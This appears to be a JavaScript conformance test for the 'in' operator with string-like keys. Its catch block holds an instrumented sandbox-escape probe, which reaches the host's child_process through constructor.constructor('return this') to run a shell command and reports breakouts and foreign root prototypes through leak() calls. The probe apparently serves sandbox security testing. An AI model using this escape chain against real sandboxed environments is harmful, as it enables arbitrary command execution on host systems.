try {
    var object = {};
    object['true'] = 1;
    if (true in object !== 'true' in object) {
        $ERROR('#1: "var object = {}; object["true"] = 1; true in object === "true" in object');
    }
    var object = {};
    object.Infinity = 1;
    if (Infinity in object !== 'Infinity' in object) {
        $ERROR('#2: "var object = {}; object.Infinity = 1; Infinity in object === "Infinity" in object');
    }
    var object = {};
    object.undefined = 1;
    if (undefined in object !== 'undefined' in object) {
        $ERROR('#4: "var object = {}; object.undefined = 1; undefined in object === "undefined" in object');
    }
    var object = {};
    object['null'] = 1;
    if (null in object !== 'null' in object) {
        $ERROR('#5: "var object = {}; object["null"] = 1; null in object === "null" in object');
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}